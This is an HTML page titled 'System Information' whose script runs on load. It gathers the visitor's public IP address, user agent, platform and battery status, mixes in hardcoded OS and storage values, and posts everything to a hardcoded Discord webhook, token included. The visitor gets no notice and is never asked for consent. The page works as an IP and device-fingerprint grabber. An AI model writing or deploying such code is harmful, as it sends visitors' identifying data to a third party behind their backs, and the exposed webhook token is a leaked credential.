<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Information</title>
</head>
<body>
    <h1>System Information</h1>
    <div id="output"></div>

    <script>
        async function getOsInfo() {
            return "OS: Linux 5.15.0-91-generic";
        }

        async function getBrowserInfo() {
            return "Browser: " + navigator.userAgent;
        }

        function getTimeInfo() {
            const estTime = new Date().toLocaleString("en-US", {timeZone: "America/New_York"});
            return "Current Time (EST): " + estTime;
        }

        async function getPublicIp() {
            const publicIp = await fetch('https://api64.ipify.org?format=json')
                                .then(response => response.json())
                                .then(data => data.ip);
            return "Public IP: " + publicIp;
        }

        async function getBatteryInfo() {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                const batteryLevel = battery.level * 100;
                const batteryStatus = battery.charging ? "Plugged in" : "Not Plugged in";
                return "Battery: " + batteryLevel.toFixed(2) + "% (" + batteryStatus + ")";
            } else {
                return "Battery: Information not available";
            }
        }

        async function getGpuInfo() {
            // Code to get GPU information (if available)
            return "GPU: None found";
        }

        function getCpuInfo() {
            return "CPU: " + navigator.platform;
        }

        async function getStorageInfo() {
            // Code to get storage information
            const totalSpace = 14.09; // Total space in GB
            const usedSpace = 10.07; // Used space in GB
            const freeSpace = totalSpace - usedSpace; // Free space in GB
            return `Storage: ${usedSpace.toFixed(2)} GB used, ${freeSpace.toFixed(2)} GB free (Total: ${totalSpace.toFixed(2)} GB)`;
        }

        async function sendToDiscord(message) {
            const webhookUrl = 'https://discord.com/api/webhooks/1205983897767383140/o3xlSmIOb4_kTtjX_ThqMBxOTyUgFvZePPr0_vWPU9Ys9f9UF-waGD08P6txUBc3SECG';
            const payload = { content: message };
            await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        }

        async function main() {
            const outputDiv = document.getElementById('output');
            try {
                const osInfo = await getOsInfo();
                const browserInfo = await getBrowserInfo();
                const timeInfo = getTimeInfo();
                const publicIp = await getPublicIp();
                const batteryInfo = await getBatteryInfo();
                const gpuInfo = await getGpuInfo();
                const cpuInfo = getCpuInfo();
                const storageInfo = await getStorageInfo();

                const message = `${osInfo}\n${browserInfo}\n${timeInfo}\n${publicIp}\n${batteryInfo}\n${gpuInfo}\n${cpuInfo}\n${storageInfo}`;
                await sendToDiscord(message);

                outputDiv.textContent = 'Data sent successfully!';
            } catch (error) {
                console.error('Error:', error);
                outputDiv.textContent = 'Error: ' + error;
            }
        }

        main();
    </script>
</body>
</html>
